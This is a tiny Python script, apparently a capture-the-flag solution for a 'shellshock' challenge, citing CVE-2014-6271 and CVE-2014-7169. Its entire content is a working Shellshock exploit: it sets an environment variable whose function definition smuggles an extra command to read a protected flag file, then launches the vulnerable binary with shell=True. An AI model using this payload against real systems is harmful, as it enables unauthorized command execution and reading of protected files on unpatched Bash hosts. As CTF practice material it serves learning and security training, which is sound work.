import subprocess
# tip:
#     use CVE-2014-6271 or CVE-2014-7169

shellshock = "env vuln='() { :;}; /bin/cat /home/shellshock/flag' /home/shellshock/shellshock"

subprocess.call(shellshock, shell=True)
